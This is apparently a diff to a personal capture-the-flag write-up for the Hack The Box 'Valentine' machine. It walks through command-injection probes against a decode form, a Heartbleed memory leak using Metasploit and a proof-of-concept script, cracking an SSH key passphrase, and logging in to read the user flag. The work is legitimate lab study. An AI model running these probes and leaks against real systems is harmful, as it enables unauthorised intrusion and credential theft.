@@ -193,7 +193,7 @@ POST /decode/ HTTP/1.1
 text=foo+%26%26+id+-a
 ```
 
-led to 
+led to
 
 ```
 Your input:
@@ -202,14 +202,247 @@ foo && id -a
 
 Your encoded input:
 
-~Š"u 
+~Š"u
 ```
 
-so definitely not sanitizing input well enough. `||` doesn't see the same 
+so definitely not sanitizing input well enough. `||` doesn't see the same
 
 and actually it's not based on the attempts at injection, any non-b64 encoded string passed to the decoder yields the same
 
+POSTing `/decode/encode.php` with `text=%3B+id+-a` gives
+
+```
+Your input:
+
+; id -a
+
+Your encoded input:
+
+‰Ö
+```
+
+`text=foobarbaz%3B+id+-a` to `/decode` gives
+```
+Your input:
+
+foobarbaz; id -a
+
+Your encoded input:
+
+~Šj¶ÚÎ'Z
+```
+
+```
+irb(main):001:0> 'Ö'.ord   #=> 214
+irb(main):003:0> "~Šj¶ÚÎ'Z".split('').collect { |c| c.ord }  #=> [126, 352, 106, 182, 218, 206, 39, 90]
+```
+
+how are we getting to `214` from
+```
+irb(main):004:0> '; id -a'.split('').collect { |c| c.ord }    #=> [59, 32, 105, 100, 32, 45, 97]
+```
+
+### 1+1 = 2
+
+was not making any forward progress, looking at tags on the page, `CVE-2014-0160`.. heartbleed. and now the box name makes sense.
+
+```
+msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run
+
+[+] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+nice, that's enough to leak.. anything we want
+
+but struggling to find a proper exploit.. and since this is an 'easy' box, we're missing something.
+
+
+```
+$ python heartbleed-exploit.py valentine.htb
+Connecting...
+Sending Client Hello...
+ ... received message: type = 22, ver = 0302, length = 66
+ ... received message: type = 22, ver = 0302, length = 885
+ ... received message: type = 22, ver = 0302, length = 331
+ ... received message: type = 22, ver = 0302, length = 4
+Handshake done...
+Sending heartbeat request with length 4 :
+ ... received message: type = 24, ver = 0302, length = 16384
+Received heartbeat response in file out.txt
+WARNING : server returned more data than it should - server is vulnerable!
+
+$ cat out.txt
+  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
+  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
+  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
+  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
+  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
+  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
+  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
+  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
+  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
+  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
+  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
+  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
+  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
+  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
+  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
+  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
+  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
+  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
+  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
+  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
+  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
+  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 7E  mV0aGVoeXBlCg==~
+  0160: 2D 49 30 CA 4D 0C A6 00 C3 BB 74 6D 8A 54 54 8A  -I0.M.....tm.TT.
+  0170: 2B 98 71 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  +.q.............
+  0180: 66 69 65 64 2D 53 69 6E 63 65 3A 20 53 61 74 2C  fied-Since: Sat,
+  0190: 20 32 30 20 4E 6F 76 20 32 30 30 34 20 32 30 3A   20 Nov 2004 20:
+  01a0: 31 36 3A 32 34 20 47 4D 54 0D 0A 49 66 2D 4E 6F  16:24 GMT..If-No
+  01b0: 6E 65 2D 4D 61 74 63 68 3A 20 22 38 32 36 37 31  ne-Match: "82671
+  01c0: 2D 66 35 2D 33 65 39 35 36 34 63 32 33 62 36 30  -f5-3e9564c23b60
+  01d0: 30 22 0D 0A 43 61 63 68 65 2D 43 6F 6E 74 72 6F  0"..Cache-Contro
+  01e0: 6C 3A 20 6D 61 78 2D 61 67 65 3D 30 0D 0A 0D 0A  l: max-age=0....
+  01f0: 3C AF E9 A7 7D D8 F7 4E B9 C7 6F 5B 65 F0 95 06  <...}..N..o[e...
+  0200: E1 3E 12 C3 F5 57 36 13 8E 1D 1A FA 82 A0 03 16  .>...W6.........
+  0210: C9 75 AB 97 00 2B 00 09 08 03 04 03 03 03 02 03  .u...+..........
+  0220: 01 00 0D 00 18 00 16 04 03 05 03 06 03 08 04 08  ................
+  0230: 05 08 06 04 01 05 01 06 01 02 03 02 01 00 2D 00  ..............-.
+  0240: 02 01 01 00 1C 00 02 40 01 00 00 00 00 00 00 00  .......@........
+
+```
+
+`$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`
+
+that doesn't look like any string we've sent in..
+
+```
+$ echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
+heartbleedbelievethehype
+```
+
+and indeed it is not. ssh password? maybe, but still need a username
+
+```
+$ john --wordlist=./foo.wl hype_key_hash
+Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
+Use the "--format=ssh-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 1 candidate left, minimum 16 needed for performance.
+heartbleedbelievethehype (hype_key_decoded)
+1g 0:00:00:00 DONE (2022-07-27 15:37) 25.00g/s 25.00p/s 25.00c/s 25.00C/s heartbleedbelievethehype
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+real    0m3.071s
+user    0m29.137s
+sys     0m0.124s
+```
+
+also, not ssh password - but password to the ssh key we have.
+
+tried `omg` as the username, no love
+
+running the heartbleed poc multiple times does give us slightly different data
+
+[poc-runner.rb](poc-runner.rb) so don't have to keep moving `out.txt` out of the way
+
+while waiting for that, trying to guess the username
+  * cupid
+  * valentine
+  * rome
+  * saint
+  * heart
+
+and..
+
+`hype` is the username - it's in the password and it's the prefix on the filename that is the key.
+
+```
+$ ssh -l hype -i hype_key_decoded valentine.htb
+Warning: Permanently added 'valentine.htb,10.10.10.79' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'hype_key_decoded':
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
+hype@Valentine:~$
+```
+
+nice.
+
+```
+hype@Valentine:~$ ls -la
+total 144
+drwxr-xr-x 21 hype hype  4096 Feb  5  2018 .
+drwxr-xr-x  3 root root  4096 Dec 11  2017 ..
+-rw-------  1 hype hype   131 Feb 16  2018 .bash_history
+-rw-r--r--  1 hype hype   220 Dec 11  2017 .bash_logout
+-rw-r--r--  1 hype hype  3486 Dec 11  2017 .bashrc
+drwx------ 11 hype hype  4096 Dec 11  2017 .cache
+drwx------  9 hype hype  4096 Dec 11  2017 .config
+drwx------  3 hype hype  4096 Dec 11  2017 .dbus
+drwxr-xr-x  2 hype hype  4096 Dec 13  2017 Desktop
+-rw-r--r--  1 hype hype    26 Dec 11  2017 .dmrc
+drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Documents
+drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Downloads
+drwxr-xr-x  2 hype hype  4096 Dec 11  2017 .fontconfig
+drwx------  3 hype hype  4096 Dec 11  2017 .gconf
+drwx------  4 hype hype  4096 Dec 11  2017 .gnome2
+-rw-rw-r--  1 hype hype   132 Dec 11  2017 .gtk-bookmarks
+drwx------  2 hype hype  4096 Dec 11  2017 .gvfs
+-rw-------  1 hype hype   636 Dec 11  2017 .ICEauthority
+drwxr-xr-x  3 hype hype  4096 Dec 11  2017 .local
+drwx------  3 hype hype  4096 Dec 11  2017 .mission-control
+drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Music
+drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Pictures
+-rw-r--r--  1 hype hype   675 Dec 11  2017 .profile
+drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Public
+drwx------  2 hype hype  4096 Dec 11  2017 .pulse
+-rw-------  1 hype hype   256 Dec 11  2017 .pulse-cookie
+drwx------  2 hype hype  4096 Dec 13  2017 .ssh
+drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Templates
+-rw-r--r--  1 root root    39 Dec 13  2017 .tmux.conf
+drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Videos
+-rw-------  1 hype hype     0 Dec 11  2017 .Xauthority
+-rw-------  1 hype hype 12173 Dec 11  2017 .xsession-errors
+-rw-------  1 hype hype  9659 Dec 11  2017 .xsession-errors.old
+hype@Valentine:~$ ls Documents/
+hype@Valentine:~$ cat .tmux.conf
+run-shell ~/.clone/path/resurrect.tmux
+hype@Valentine:~$ ls -la .ssh/
+total 24
+drwx------  2 hype hype 4096 Dec 13  2017 .
+drwxr-xr-x 21 hype hype 4096 Feb  5  2018 ..
+-rw-------  1 hype hype  397 Dec 13  2017 authorized_keys
+-rw-------  1 hype hype 1766 Dec 13  2017 id_rsa
+-rw-r--r--  1 hype hype  397 Dec 13  2017 id_rsa.pub
+-rw-------  1 hype hype  222 Dec 13  2017 known_hosts
+hype@Valentine:~$ cat .ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUU3iZcDCfeCCIML834Fx2YQF/TIyXoi6VI6S/1Z9SsZM9NShwUdRr3mPJocWOZ7RzuEbpRFZL1zgkykHfn8pR0Wc6kjQw4lCVGV237iqWlG+MSGRVOPuDS1UmaN3dN6bLL541LNpTscE4RbNzPhP6pD
+5pKsSX7IcMsAfyZ9rpfZKuciS0LXpbTS6kokrru6/MM1u3DkcfxuSW8HeO6lWQ7sbCMLbCp9WjKmBRlxMY4Jj0tUsz8f66vGaHxWiaUzBFy5m82qfCyL9N4Yro1xe1RF8uC58i8rE/baDzW2GMK7JVcAvPiunu2J0QeWg8sVOytLLxPVxPrPKDb7CBEkzN
+ hype@hemorrhage
+hype@Valentine:~$ find . -iname user.txt
+./Desktop/user.txt
+hype@Valentine:~$ cat Desktop/user.txt
+e6710a5464769fd5fcd216e076961750
+```
+
+user down
+
 ## flag
+
 ```
 user:
 root:
